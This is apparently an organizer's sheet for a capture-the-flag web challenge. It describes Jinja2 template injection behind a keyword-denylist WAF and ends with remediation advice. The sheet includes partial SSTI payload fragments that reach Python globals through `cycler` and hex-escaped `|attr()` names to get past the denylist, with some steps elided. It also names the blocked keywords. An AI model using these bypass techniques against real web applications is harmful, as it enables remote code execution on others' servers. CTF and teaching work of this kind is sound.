# h06 — Render Unto Ceylon (Ceylon Kade)

**Category:** Web / SSTI → RCE (WAF bypass) · **Difficulty:** Hard · **Points:** 400 (dynamic)

## Intended solve
The invoice previewer renders a user-supplied template with Jinja2 → **SSTI**. A naive denylist
WAF blocks `{{`, `__class__`, `os`, `popen`, `import`, and a few keywords. Bypass it.

```jinja
{# 1) Use {% %} statement blocks instead of {{ }} expression blocks the WAF greps for #}
{% set x = cycler.__init__.__globals__ %}          {# reach globals without the banned words #}

{# 2) Build banned attribute names with |attr and string tricks so "__class__"/"os" never
      appear literally in the request: #}
{% set c = (request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")) %}
{# ... walk the object graph to subprocess/popen via |attr(concat(...)) #}

{# 3) Execute and surface output into the rendered invoice: #}
{{% ... %}}  -> reads /flag  ->  CYPHER{...}
```
Intended path: statement-block SSTI + `|attr()` with hex/concatenated attribute names to evade the
literal-substring denylist, reaching a `subprocess`/`os.popen` gadget and reading `/flag`.

## Infra & safety
- Per-team instance (Flask + gunicorn). WAF is an explicit denylist middleware (the point is that
  denylists are bypassable). RCE is confined to the throwaway container; `/flag` is the only prize.
- Egress blocked, so SSTI→RCE cannot pivot to metadata or other challenges.

## Remediation (Blue Team Brief)
Never render user input as a template. If templating is unavoidable, use a sandboxed engine with
autoescaping and no attribute access, or a logic-less templating language. Denylist WAFs are not a
control — allow-list and remove the sink.
